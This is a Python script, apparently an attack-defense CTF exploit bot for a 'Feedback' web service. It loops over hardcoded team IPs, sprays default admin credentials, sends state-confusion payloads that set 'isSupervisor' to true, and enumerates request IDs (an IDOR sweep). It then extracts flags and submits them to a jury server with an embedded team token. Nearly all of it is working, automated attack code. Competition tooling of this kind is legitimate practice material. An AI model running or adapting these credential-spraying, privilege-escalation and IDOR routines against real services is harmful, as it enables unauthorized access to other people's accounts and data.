#!/usr/bin/env python3
"""Authorized Attack-Defense CTF flag hunter for the Feedback service.

The script only targets the hosts supplied on the command line, extracts strings
matching the CTF flag format, and submits newly found flags to the jury.

Usage:
    python ctf_flag_hunter.py
    python ctf_flag_hunter.py --once --mode all
"""

from __future__ import annotations

import argparse
import concurrent.futures
import json
import re
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from typing import Any

DEFAULT_TARGETS = [
    "10.62.6.10", "10.62.11.10", "10.62.8.10", "10.62.4.10",
    "10.62.3.10", "10.62.5.10", "10.62.9.10", "10.62.17.10",
    "10.62.1.10", "10.62.2.10", "10.62.14.10", "10.62.18.10",
    "10.62.16.10", "10.62.7.10", "10.62.19.10", "10.62.12.10",
    "10.62.15.10", "10.62.10.10",
]
JURY_URL = "http://10.62.0.12:8080"
JURY_TOKEN = "31a00856ca9a222b"
SCAN_INTERVAL_SECONDS = 30

FLAG_RE = re.compile(r"\b[A-Z0-9]{16,64}=")
USER_RE = re.compile(r"^[A-Za-z0-9_.-]{3,32}$")
DEFAULT_CREDENTIALS = (
    ("admin", "admin"),
    ("admin", "arktur_secret"),
    ("supervisor", "supervisor"),
)


class HttpClient:
    def __init__(self, base_url: str, timeout: float) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.cookies = CookieJar()

    def request(self, method: str, path: str, body: Any = None,
                headers: dict[str, str] | None = None) -> tuple[int, str]:
        payload = None
        request_headers = {"User-Agent": "feedback-ctf-hunter/1.0"}
        if headers:
            request_headers.update(headers)
        if body is not None:
            payload = json.dumps(body).encode()
            request_headers.setdefault("Content-Type", "application/json")
        request = urllib.request.Request(
            self.base_url + path, data=payload, headers=request_headers,
            method=method,
        )
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies),
        )
        try:
            with opener.open(request, timeout=self.timeout) as response:
                return response.status, response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            return error.code, error.read().decode("utf-8", "replace")
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            return 0, str(error)


def extract_flags(text: str) -> set[str]:
    return set(FLAG_RE.findall(text.upper()))


def random_username(target: str) -> str:
    suffix = secrets.token_hex(4)
    host_part = re.sub(r"[^A-Za-z0-9]", "", target)[-8:]
    return f"ctf{host_part}{suffix}"[:32]


def register_or_login(client: HttpClient, username: str, password: str) -> bool:
    status, _ = client.request(
        "POST", "/api/register", {"username": username, "password": password},
    )
    if status in (200, 201, 302):
        return True
    status, _ = client.request(
        "POST", "/api/login", {"username": username, "password": password},
    )
    return status in (200, 302)


def try_default_credentials(client: HttpClient) -> set[str]:
    found: set[str] = set()
    for username, password in DEFAULT_CREDENTIALS:
        status, _ = client.request(
            "POST", "/api/login", {"username": username, "password": password},
        )
        if status not in (200, 302):
            continue
        for path in ("/api/requests", "/requests"):
            read_status, content = client.request("GET", path)
            if read_status == 200:
                found.update(extract_flags(content))
    return found


def try_donos_state(client: HttpClient, username: str) -> set[str]:
    """Try the legacy donos state-confusion primitive from the original source."""
    found: set[str] = set()
    payloads = (
        {username: {"isSupervisor": True}},
        {"banned_leaders": {username: {"isSupervisor": True}}},
        {"distinctive_features": f"{username}.isSupervisor=true"},
    )
    for payload in payloads:
        status, _ = client.request("POST", "/api/donos", payload)
        if status not in (200, 201):
            continue
        read_status, content = client.request("GET", "/api/requests")
        if read_status == 200:
            found.update(extract_flags(content))
    return found


def try_idor(client: HttpClient, max_id: int) -> set[str]:
    found: set[str] = set()
    for request_id in range(1, max_id + 1):
        status, content = client.request("GET", f"/api/requests/{request_id}")
        if status == 200:
            found.update(extract_flags(content))
    return found


def scan_target(target: str, mode: str, timeout: float, max_id: int) -> tuple[str, set[str], str]:
    base_url = target if "://" in target else f"http://{target}:3000"
    client = HttpClient(base_url, timeout)
    found: set[str] = set()
    notes: list[str] = []

    if mode in ("all", "default"):
        found.update(try_default_credentials(client))
        notes.append("default-credentials")

    if mode in ("all", "register", "donos", "idor"):
        username = random_username(urllib.parse.urlparse(base_url).hostname or "target")
        password = secrets.token_urlsafe(18)
        if register_or_login(client, username, password):
            notes.append(f"session={username}")
            if mode in ("all", "register", "donos"):
                found.update(try_donos_state(client, username))
                notes.append("donos-state")
            if mode in ("all", "register", "idor"):
                found.update(try_idor(client, max_id))
                notes.append("idor-probe")
        else:
            notes.append("auth-failed")

    return target, found, ",".join(notes)


def submit_flags(jury_url: str, token: str, flags: set[str], timeout: float) -> None:
    if not flags:
        return
    request = urllib.request.Request(
        jury_url.rstrip("/") + "/flags/",
        data=json.dumps(sorted(flags)).encode(),
        headers={
            "Content-Type": "application/json",
            "X-Team-Token": token,
            "User-Agent": "feedback-ctf-hunter/1.0",
        },
        method="PUT",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            result = response.read().decode("utf-8", "replace")
            print(f"[jury] HTTP {response.status}: {result[:500]}")
    except urllib.error.HTTPError as error:
        print(f"[jury] HTTP {error.code}: {error.read().decode('utf-8', 'replace')[:500]}", file=sys.stderr)
    except (urllib.error.URLError, TimeoutError, OSError) as error:
        print(f"[jury] submission failed: {error}", file=sys.stderr)


def read_targets(path: str | None) -> list[str]:
    if not path:
        return DEFAULT_TARGETS
    with open(path, encoding="utf-8") as handle:
        return [line.strip() for line in handle if line.strip() and not line.startswith("#")]


def main() -> int:
    parser = argparse.ArgumentParser(description="Feedback CTF flag hunter")
    parser.add_argument("--targets", help="file with one target IP/URL per line")
    parser.add_argument("--mode", choices=("all", "default", "register", "donos", "idor"), default="all")
    parser.add_argument("--jury-url", default=JURY_URL)
    parser.add_argument("--jury-token", default=JURY_TOKEN, help=argparse.SUPPRESS)
    parser.add_argument("--workers", type=int, default=8)
    parser.add_argument("--timeout", type=float, default=4.0)
    parser.add_argument("--max-id", type=int, default=50)
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--once", action="store_true", help="run one scan instead of looping every 30 seconds")
    args = parser.parse_args()

    targets = read_targets(args.targets)
    while True:
        started_at = time.monotonic()
        all_flags: set[str] = set()
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.workers)) as executor:
            jobs = [
                executor.submit(scan_target, target, args.mode, args.timeout, args.max_id)
                for target in targets
            ]
            for job in concurrent.futures.as_completed(jobs):
                target, flags, notes = job.result()
                all_flags.update(flags)
                print(f"[{target}] {notes}: {len(flags)} flag(s)", flush=True)
                for flag in sorted(flags):
                    print(f"  {flag}", flush=True)

        print(f"[summary] unique flags: {len(all_flags)}", flush=True)
        if not args.dry_run:
            submit_flags(args.jury_url, args.jury_token, all_flags, args.timeout)
        if args.once:
            break

        elapsed = time.monotonic() - started_at
        time.sleep(max(0.0, SCAN_INTERVAL_SECONDS - elapsed))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
